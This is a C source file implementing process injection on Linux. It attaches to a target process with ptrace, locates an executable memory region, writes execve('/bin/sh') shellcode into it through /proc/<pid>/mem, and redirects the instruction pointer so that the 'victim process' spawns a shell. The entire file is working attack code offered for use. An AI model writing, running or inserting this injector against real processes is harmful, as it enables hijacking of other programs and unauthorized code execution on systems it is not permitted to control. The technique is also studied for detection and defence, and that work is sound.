/*
 * /proc/mem Process Injection
 *
 * This technique injects shellcode by directly writing to /proc/<pid>/mem
 * Combined with ptrace to control the victim process.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>
#include <sys/user.h>
#include <fcntl.h>
#include <sys/mman.h>

/* Shellcode: execve("/bin/sh", NULL, NULL) - x86_64 */
unsigned char shellcode[] =
    "\x48\x31\xd2"                      // xor    rdx, rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f"  // movabs rbx, 0x68732f6e69622f2f
    "\x73\x68"
    "\x48\xc1\xeb\x08"                  // shr    rbx, 0x8
    "\x53"                              // push   rbx
    "\x48\x89\xe7"                      // mov    rdi, rsp
    "\x50"                              // push   rax
    "\x57"                              // push   rdi
    "\x48\x89\xe6"                      // mov    rsi, rsp
    "\xb0\x3b"                          // mov    al, 0x3b
    "\x0f\x05";                         // syscall

/*
 * Find a readable and executable memory region in the target process
 */
unsigned long find_executable_region(pid_t pid) {
    char maps_path[256];
    char line[256];
    unsigned long start, end;
    char perms[5];

    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    FILE *maps = fopen(maps_path, "r");
    if (!maps) {
        perror("fopen maps");
        return 0;
    }

    /* Look for a region with r-x permissions (readable and executable) */
    while (fgets(line, sizeof(line), maps)) {
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
            /* We want readable and executable regions */
            if (perms[0] == 'r' && perms[2] == 'x') {
                /* Make sure there's enough space for shellcode */
                if (end - start >= sizeof(shellcode)) {
                    fclose(maps);
                    printf("[+] Found executable region: 0x%lx-0x%lx (%s)\n",
                           start, end, perms);
                    return start;
                }
            }
        }
    }

    fclose(maps);
    return 0;
}

/*
 * Inject shellcode using /proc/mem write
 */
int inject_via_proc_mem(pid_t pid) {
    char mem_path[256];
    int mem_fd;
    unsigned long inject_addr;
    struct user_regs_struct regs, saved_regs;

    printf("[*] Attaching to process %d...\n", pid);

    /* Attach to the target process */
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return -1;
    }

    /* Wait for the process to stop */
    waitpid(pid, NULL, 0);
    printf("[+] Attached successfully\n");

    /* Save original register state */
    if (ptrace(PTRACE_GETREGS, pid, NULL, &saved_regs) == -1) {
        perror("ptrace getregs");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* Find an executable region */
    inject_addr = find_executable_region(pid);
    if (!inject_addr) {
        fprintf(stderr, "[-] Failed to find suitable injection address\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    printf("[*] Injection address: 0x%lx\n", inject_addr);

    /* Open /proc/<pid>/mem for writing */
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
    mem_fd = open(mem_path, O_RDWR);
    if (mem_fd == -1) {
        perror("open /proc/mem");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* Seek to the injection address */
    if (lseek(mem_fd, inject_addr, SEEK_SET) == -1) {
        perror("lseek");
        close(mem_fd);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* Write shellcode directly to process memory via /proc/mem */
    printf("[*] Writing shellcode via /proc/%d/mem...\n", pid);
    ssize_t written = write(mem_fd, shellcode, sizeof(shellcode) - 1);
    if (written == -1) {
        perror("write to /proc/mem");
        close(mem_fd);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    printf("[+] Wrote %zd bytes of shellcode\n", written);
    close(mem_fd);

    /* Modify RIP to point to shellcode */
    memcpy(&regs, &saved_regs, sizeof(regs));
    regs.rip = inject_addr;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
        perror("ptrace setregs");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    printf("[+] RIP redirected to 0x%lx\n", inject_addr);
    printf("[*] Detaching and executing shellcode...\n");

    /* Detach and let the process continue with shellcode */
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        perror("ptrace detach");
        return -1;
    }

    printf("[+] Injection complete!\n");
    return 0;
}

int main(int argc, char *argv[]) {
    pid_t target_pid;

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    target_pid = atoi(argv[1]);
    if (target_pid <= 0) {
        fprintf(stderr, "Invalid PID\n");
        return 1;
    }

    printf("=== /proc/mem Process Injection ===\n");
    printf("[*] Target PID: %d\n", target_pid);

    if (inject_via_proc_mem(target_pid) == 0) {
        printf("\n[SUCCESS] Shellcode injected and executed!\n");
        printf("[INFO] Check the victim process - it should now have a shell\n");
        return 0;
    } else {
        fprintf(stderr, "\n[FAILED] Injection failed\n");
        return 1;
    }
}
